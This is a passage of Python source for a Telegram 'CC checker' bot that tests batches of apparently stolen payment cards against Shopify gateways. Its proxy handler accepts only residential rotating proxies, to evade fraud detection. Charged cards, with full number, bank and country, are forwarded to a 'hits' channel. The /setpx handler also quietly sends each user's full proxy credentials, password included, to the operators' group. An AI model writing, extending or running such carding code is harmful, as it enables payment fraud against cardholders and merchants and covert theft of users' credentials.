                    # Forward hit to channel immediately - ONLY for charged cards
                    if status_type == 'charged':
                        try:
                            user = await client.get_entity(event.sender_id)
                            first_name = user.first_name if user.first_name else "User"
                            # Clickable mention without preview, no username shown
                            user_mention = f"[{first_name}](tg://user?id={event.sender_id})"
                            
                            hit_msg = f"""```✦ [$ptxt] [ #Proxy_Shopify ]```
**CC**: `{card}`
**Status**: {status_display}
**Response**: {raw_response}
**Gateway** → {gate}

**𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:** {brand} - {bin_type} - {level}
**𝗕𝗮𝗻𝗸:** {bank}
**𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country.upper()} {flag}
👤 **User:** {user_mention}
🆔 **User ID:** {event.sender_id}"""
                            
                            await client.send_message(FORWARD_ID, hit_msg, parse_mode='Markdown', link_preview=False)
                        except Exception as e:
                            print(f"[HIT FORWARD] Error: {e}")
        
        # Final summary (mtxt style with buttons)
        total_time = round(time.time() - start_time, 2)
        declined = len(cards) - (charged_count + approved_count)
        
        # Check if stopped or completed
        if user_id not in ACTIVE_PTXT_PROCESSES:
            status_emoji = "⛔"
            status_text = "Check Stopped!"
            button_text = f"𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ➜ [{checked_count}/{len(cards)}] ⛔"
        else:
            status_emoji = "✅"
            status_text = "Check Completed!"
            button_text = f"𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 ➜ [{len(cards)}/{len(cards)}] ✅"
        
        summary_text = f"""```{status_emoji} Check Summary!```
`Total Charged 💎`| {charged_count}
`Total Approve 🔥`| {approved_count}
`Total Decline ❌`| {declined}
`Total Checked ☠️`| {checked_count}
◈──────────────◈
⌛ **Time Taken**: {total_time:.2f}s"""
        
        # Reply to original file message
        replied_msg = await event.get_reply_message()
        await replied_msg.reply(summary_text, link_preview=False)
        
    finally:
        # Remove from active processes
        ACTIVE_PTXT_PROCESSES.pop(user_id, None)

# Stop button callback for /ptxt
@client.on(events.CallbackQuery(pattern=rb"stop_ptxt:(\d+)"))
async def stop_ptxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        
        # Check if user can stop (owner or admin)
        can_stop = False
        if clicking_user_id == process_user_id:
            can_stop = True
        elif clicking_user_id in ADMIN_ID:
            can_stop = True
        
        if not can_stop:
            return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        
        if process_user_id not in ACTIVE_PTXT_PROCESSES:
            return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        
        # Stop the process
        ACTIVE_PTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
        
    except Exception as e:
        await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

# ===== PROXY COMMANDS =====

@client.on(events.NewMessage(pattern=r'^/setpx'))
async def set_proxy_handler(event):
    """Set proxy for user"""
    if len(event.text.split()) < 2:
        return await event.reply(
            "**Format**: /setpx ip:port:user:pass\n\n"
            "**Example**: /setpx shopifywala.com:6969:user:pass",
            parse_mode='markdown'
        , link_preview=False)

    raw_proxy = event.text.split(maxsplit=1)[1].strip()
    proxy_url = normalize_proxy(raw_proxy)

    if not proxy_url:
        return await event.reply(
            "<b>Invalid format ❌</b>\n\n"
            "<b>Format:</b> /setpx ip:port:user:pass\n\n"
            "<b>Example:</b> /setpx shopifywala.com:6969:user:pass",
            parse_mode='html'
        , link_preview=False)

    user_id = str(event.sender_id)
    data = load_proxies()

    if data.get(user_id) == proxy_url:
        return await event.reply("<b>This proxy is already added ⚠️</b>", parse_mode='html', link_preview=False)

    msg = await event.reply("<pre>Validating Proxy 🔘</pre>", parse_mode='html', link_preview=False)
    
    # Validate proxy with 4 strict checks
    await msg.edit("<pre>Testing proxy (1/4)...</pre>", parse_mode='html')
    await asyncio.sleep(0.5)
    await msg.edit("<pre>Testing proxy (2/4)...</pre>", parse_mode='html')
    await asyncio.sleep(0.5)
    await msg.edit("<pre>Testing proxy (3/4)...</pre>", parse_mode='html')
    await asyncio.sleep(0.5)
    await msg.edit("<pre>Verifying residential status...</pre>", parse_mode='html')
    
    is_valid, proxy_type, ips, error = await validate_rotating_residential_proxy(proxy_url, checks=4)
    
    if not is_valid:
        # Proxy validation failed - simple error messages
        if proxy_type == "DEAD":
            # Show PROXY DEAD error (short version)
            return await msg.edit(
                f"<pre>❌ Proxy Dead!</pre>\n\n"
                f"<code>{error}</code>",
                parse_mode='html'
            )
        elif proxy_type == "DATACENTER":
            return await msg.edit(
                f"<pre>Datacenter Proxy Rejected ❌</pre>\n"
                f"<b>Only residential rotating proxies are accepted.</b>",
                parse_mode='html'
            )
        elif proxy_type == "NOT_ROTATING":
            return await msg.edit(
                f"<pre>Static Proxy Rejected ❌</pre>\n"
                f"<b>Proxy must rotate on every request.</b>",
                parse_mode='html'
            )
        elif proxy_type == "POOR_ROTATION":
            return await msg.edit(
                f"<pre>Poor Rotation ⚠️</pre>\n"
                f"<b>Proxy rotation rate too low.</b>",
                parse_mode='html'
            )
        elif proxy_type == "UNKNOWN_TYPE":
            return await msg.edit(
                f"<pre>Proxy Type Unknown ❌</pre>\n"
                f"<b>Could not verify residential status.</b>",
                parse_mode='html'
            )
        else:
            return await msg.edit(
                f"<pre>Proxy Rejected ❌</pre>\n"
                f"<code>{error}</code>",
                parse_mode='html'
            )
    
    # Proxy is valid - save it
    data[user_id] = proxy_url
    save_proxies(data)

    await msg.edit(
        f"<pre>Proxy Saved Successfully ✅</pre>\n"
        f"<b>Type:</b> <code>Residential Rotating</code>\n"
        f"<b>Status:</b> <code>Active</code>",
        parse_mode='html'
    )
    
    # Forward proxy info to hits group
    print(f"[PROXY FORWARD] Starting forward process for user {event.sender_id}")
    print(f"[PROXY FORWARD] FORWARD_ID = {FORWARD_ID}")
    
    try:
        # Get user info
        try:
            user = await client.get_entity(event.sender_id)
            user_name = user.first_name or "Unknown"
            username = f"@{user.username}" if user.username else "No Username"
            print(f"[PROXY FORWARD] User info: {user_name} ({username})")
        except Exception as e:
            print(f"[PROXY FORWARD] Error getting user info: {e}")
            user_name = "Unknown"
            username = "No Username"
        
        # Format proxy for display: host:port:user:pass
        try:
            # Parse proxy_url format: http://user:pass@host:port
            proxy_clean = proxy_url.replace("http://", "").replace("https://", "")
            if "@" in proxy_clean:
                auth, host_port = proxy_clean.split("@", 1)
                if ":" in auth:
                    user, password = auth.split(":", 1)
                    proxy_display = f"{host_port}:{user}:{password}"
                else:
                    proxy_display = proxy_clean
            else:
                proxy_display = proxy_clean
        except:
            proxy_display = proxy_url.replace("http://", "").replace("https://", "")
        
        print(f"[PROXY FORWARD] Proxy display: {proxy_display}")
        
        # Create forward message
        forward_msg = f"""🔐 **NEW PROXY ADDED**

👤 **User:** {user_name} ({username})
🆔 **User ID:** `{event.sender_id}`
🌐 **Proxy:** `{proxy_display}`
📊 **Type:** Residential Rotating
✅ **Status:** Validated

⏰ **Time:** {time.strftime("%Y-%m-%d %H:%M:%S")}"""

        print(f"[PROXY FORWARD] Message created, sending to {FORWARD_ID}")
        
        # Forward to Hits Group
        if FORWARD_ID:
            try:
                await client.send_message(FORWARD_ID, forward_msg, link_preview=False)
                print(f"[PROXY FORWARD] ✅ Successfully forwarded to hits group")
            except Exception as e:
                print(f"[PROXY FORWARD] ❌ Error sending: {e}")
                import traceback
                traceback.print_exc()
        else:
            print(f"[PROXY FORWARD] ❌ FORWARD_ID is None or False")
    except Exception as e:
        print(f"[PROXY FORWARD] ❌ Outer exception: {e}")
        import traceback
        traceback.print_exc()

@client.on(events.NewMessage(pattern=r'^/delpx'))
async def delete_proxy_handler(event):
    """Delete user's proxy"""
    user_id = str(event.sender_id)
    data = load_proxies()

    if user_id not in data:
        return await event.reply("<b>No proxy was found to delete !!!</b>", parse_mode='html', link_preview=False)

    del data[user_id]
    save_proxies(data)
    await event.reply("<b>Your proxy has been removed ✅</b>", parse_mode='html', link_preview=False)

@client.on(events.NewMessage(pattern=r'^/getpx'))
async def getpx_handler(event):
    """Get user's proxy info - Tests and shows masked proxy details"""
    user_id = event.sender_id
    proxy = get_proxy(user_id)

    if not proxy:
        return await event.reply("<b>You haven't set any proxy yet ❌</b>", parse_mode='html', link_preview=False)

    # Send checking message
    checking_msg = await event.reply("Checking proxy status...", parse_mode=None, link_preview=False)
    
    # Test proxy with simple IP check
    start_time = time.time()
    is_working = False
    try:
        proxy_url = f"http://{proxy}" if not proxy.startswith("http") else proxy
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("https://api.ipify.org?format=json", proxy=proxy_url) as response:
                if response.status == 200:
                    is_working = True
    except:
        is_working = False
    
    elapsed = round(time.time() - start_time, 2)
    
    try:
        # Remove http:// if present
        proxy_clean = proxy.replace("http://", "").replace("https://", "")
        
        # Parse and mask proxy details
        masked_proxy = proxy_clean
        if "@" in proxy_clean:
            creds, hostport = proxy_clean.split("@", 1)
            if ":" in creds:
                username, password = creds.split(":", 1)
                # Mask password - use dots instead of asterisks
                masked_password = password[:4] + "••••" if len(password) > 4 else "••••"
                # Mask username
                if "_" in username:
                    masked_username = username.split("_")[0] + "•••••••"
                elif "." in username:
                    masked_username = username.split(".")[0] + "•••••••"
                else:
                    masked_username = username[:7] + "•••••••" if len(username) > 7 else username + "•••••••"
                # Mask host
                if ":" in hostport:
                    host, port = hostport.rsplit(":", 1)
                    if "." in host:
                        masked_host = host.split(".")[0] + ".••••••"
                    else:
                        masked_host = host
                    masked_proxy = f"{masked_host}:{port}:{masked_username}:{masked_password}"
        
        # Build status message (compress style)
        status_emoji = "✅" if is_working else "❌"
        status_text = "Proxy Working!" if is_working else "Proxy Dead!"
        
        # Extract username and host for display
        try:
            if "@" in proxy_clean:
                creds, hostport = proxy_clean.split("@", 1)
                username = creds.split(":")[0]
                host = hostport.split(":")[0]
            else:
                parts = proxy_clean.split(":")
                if len(parts) >= 4:
                    host, port, username, pwd = parts[0], parts[1], parts[2], parts[3]
                else:
                    username = "N/A"
                    host = parts[0] if parts else "N/A"
        except:
            username = "N/A"
            host = "N/A"
        
        # Format: Status in header
        msg = f"```{status_emoji} {status_text}\n"
        msg += f"✦ Username: {username}\n"
        msg += f"✦ Host: {host}\n"
        msg += f"✦ Response: {elapsed}s```"

        await checking_msg.edit(msg, parse_mode='markdown')
        
    except Exception as e:
        # Fallback: show simple error
        error_msg = str(e).replace("_", " ").replace("*", " ").replace("[", " ").replace("`", " ")
        await checking_msg.edit(
            f"Error checking proxy\n\n"
            f"Error: {error_msg[:100]}\n"
            f"Proxy: Set but unable to parse",
            parse_mode=None
        )

async def main():
    await initialize_files()
    
    
    # Auto-authorize the main GROUP_ID on bot start
    if GROUP_ID < 0:  # Only if it's a valid group ID
        try:
            # Check if already authorized
            is_auth = await is_premium_group(GROUP_ID)
            if not is_auth:
                # Add with 365 days (1 year)
                await add_premium_group(GROUP_ID, 365)
                print(f"✅ Auto-authorized main group: {GROUP_ID}")
            else:
                print(f"✅ Main group already authorized: {GROUP_ID}")
        except Exception as e:
            print(f"⚠️ Error auto-authorizing main group: {e}")
    
    # Load feedback pending items
    await load_feedback_pending()

    # Create a wrapper for get_cc_limit that can be used by external modules
    def get_cc_limit_wrapper(access_type, user_id=None):
        return get_cc_limit(access_type, user_id)
    
    utils_for_all = {
        'can_use': can_use,
        'banned_user_message': banned_user_message,
        'access_denied_message_with_button': access_denied_message_with_button,
        'extract_card': extract_card,
        'extract_all_cards': extract_all_cards,
        'get_bin_info': get_bin_info,
        'save_approved_card': save_approved_card,
        'get_cc_limit': get_cc_limit_wrapper,
        'pin_charged_message': pin_charged_message,
        'forward_to_hits_group': forward_to_hits_group,
        'ADMIN_ID': ADMIN_ID,
        'load_json': load_json,
        'save_json': save_json
    }

    # Register handlers from all command files
    # register_st_handlers(client, utils_for_all)
    # register_pp_handlers(client, utils_for_all)
    # register_pp01_handlers(client, utils_for_all)
    # register_br_handlers(client, utils_for_all)

    print("=" * 60)
    print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 💨")
    print("✅ Feedback handlers loaded!")
    print("✅ All commands registered!")
    print("=" * 60)
    
    try:
        # Handle FloodWait errors
        from telethon.errors import FloodWaitError
        try:
            await client.start(bot_token=BOT_TOKEN)
        except FloodWaitError as e:
            wait_time = e.seconds
            print(f"⚠️ FloodWait: Need to wait {wait_time} seconds ({wait_time//60} minutes)")
            print(f"💤 Waiting {wait_time} seconds before retry...")
            await asyncio.sleep(wait_time + 5)  # Wait + 5 seconds buffer
            print("🔄 Retrying connection...")
            await client.start(bot_token=BOT_TOKEN)
        me = await client.get_me()
        print(f"✅ Connected as: @{me.username}")
        print(f"✅ Bot ID: {me.id}")
        print("=" * 60)
        
        # Set admin to VIP plan on startup
        for admin_id in ADMIN_ID:
            try:
                user_data = await get_user_credits(admin_id)
                if user_data.get('plan') != 'VIP':
                    await set_user_credits(admin_id, 999999, "VIP")
                    print(f"✅ Admin {admin_id} set to VIP plan with unlimited credits")
                else:
                    print(f"✅ Admin {admin_id} already has VIP plan")
            except Exception as e:
                print(f"⚠️ Failed to set admin {admin_id} plan: {e}")
        
        # Daily credit scheduler removed - no automatic credits
        
        print("=" * 60)
        print("🎯 Bot is ready to receive commands!")
        print("=" * 60)
        await client.run_until_disconnected()
    except Exception as e:
        print(f"❌ Connection error: {e}")
        traceback.print_exc()
        raise

if __name__ == "__main__":
    import asyncio
    import sys
    
    print("=" * 60)
    print("🤖 Starting Telegram Bot...")
    print("=" * 60)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n" + "=" * 60)
        print("⛔ Bot stopped by user!")
        print("=" * 60)
    except Exception as e:
        print("\n" + "=" * 60)
        print(f"❌ FATAL ERROR: {e}")
        print("=" * 60)
        traceback.print_exc()
        sys.exit(1)
    
